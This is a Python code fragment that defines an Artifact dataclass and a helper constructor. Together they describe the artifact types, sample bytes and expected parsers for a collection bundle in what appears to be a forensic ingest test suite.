@dataclass(frozen=True)
class Artifact:
    """One artifact shape Talon writes into a bundle.

    category  Talon collection key (ARTIFACT_LABELS in tools/talon/collect.py)
    path      bundle-relative arcname, verbatim from the collector
    sample    bytes faithful enough for a content-sniffing parser to claim
    parser    Babel PLUGIN_NAME that must claim it; None = declared open gap
    gap       why no dedicated parser exists yet (required when parser is None)
    mime      MIME the ingest stage would detect, when it affects routing
    empty_ok  why 0 events is the correct result for this sample (see below)
    """

    category: str
    path: str
    sample: bytes
    parser: str | None
    gap: str = ""
    mime: str = "application/octet-stream"
    empty_ok: str = ""
    tags: tuple[str, ...] = field(default=())


def _a(
    category,
    path,
    sample,
    parser,
    *,
    gap="",
    mime="application/octet-stream",
    empty_ok="",
    tags=(),
):
    return Artifact(category, path, sample, parser, gap, mime, empty_ok, tuple(tags))


